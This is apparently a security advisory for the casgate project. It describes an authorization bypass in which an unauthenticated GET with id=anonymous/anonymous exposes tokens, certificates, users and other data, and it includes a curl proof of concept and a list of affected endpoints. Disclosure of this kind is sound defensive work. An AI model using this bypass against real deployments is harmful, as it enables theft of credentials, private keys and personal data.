# Multiple Broken Function-Level Authorization vulnerabilities

## Description

### Summary

`casgate` allows remote unauthenticated attacker to obtain sensitive information via GET request to an API endpoint.

This issue is solved in PR [#201](https://github.com/casgate/casgate/pull/201). If this PR will be rejected the issue worth fixing in any other way.

### Details

An attacker could use `id` parameter of GET requests with value `anonymous/ anonymous` to bypass authorization on certain API endpoints.

The attack became possible thanks to the last predicate of built-in matcher for `api-model-built-in` model:

```
[matchers]
m = (r.subOwner == p.subOwner || p.subOwner == "*") && \
    (r.subName == p.subName || p.subName == "*" || r.subName != "anonymous" && p.subName == "!anonymous") && \
    (r.method == p.method || p.method == "*") && \
    (r.urlPath == p.urlPath || p.urlPath == "*") && \
    (r.objOwner == p.objOwner || p.objOwner == "*") && \
    (r.objName == p.objName || p.objName == "*") || \
    (r.subOwner == r.objOwner && r.subName == r.objName)   <<-- this one

```

The predicate is intended to allow access for any user to his own account. `subOwner` and `subName` are filled from session. If user is not authenticated, both of these variables are set to `anonymous`. In case of access to specific object (i.e. user account) `objOwner` and `objName` are populated from `id` parameter of GET request. The same parameter is also used by ORM to identify accessed object. But in case of list operation (with no specific object) `id` parameter is ignored by object access code so it could be set to any value.

Different endpoints have different impact.

Endpoints with **CRITICAL** impact:

* `/api/get-adapters`
* `/api/get-certs`
* `/api/get-globle-certs`
* `/api/get-syncers`
* `/api/get-tokens`

Endpoints with **HIGH** impact:

* `/api/get-ldap-users`
* `/api/get-models`
* `/api/get-user-payments`
* `/api/get-users`
* `/api/get-webhooks`

Endpoints with **MODERATE** impact (disclose internal data):

* `/api/get-enforcers`
* `/api/get-global-providers`
* `/api/get-groups`
* `/api/get-ldaps`
* `/api/get-resources`
* `/api/get-roles`

### PoC

```
user@host ~ % curl "http://localhost:8000/api/get-tokens?id=anonymous/anonymous"

{
  "status": "ok",
  "msg": "",
  "sub": "",
  "name": "",
  "data": [
    {
      "owner": "admin",
      "name": "cert-built-in",
      "createdTime": "2024-05-21T13:11:07Z",
      "displayName": "Built-in Cert",
      "scope": "JWT",
      "type": "x509",
      "cryptoAlgorithm": "RS256",
      "bitSize": 4096,
      "expireInYears": 20,
      "certificate": "-----BEGIN CERTIFICATE-----\nMIIE3TCC...\n-----END CERTIFICATE-----\n",
      "privateKey": "-----BEGIN RSA PRIVATE KEY-----\nMIIJJ...\n-----END RSA PRIVATE KEY-----\n"
    }
  ],
  "data2": 1
}%

```
### Impact

Successful exploitaion of the vulnerability in endpoint with **CRITICAL** impact could lead to account takeover, privilege escalation or provide attacker with credential to other services.

Endpoints with **HIGH** impact disclose sensitive or personal data.

Endpoints with **MODERATE** impact disclose internal data that could be used by attacked to develop next attack stage.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
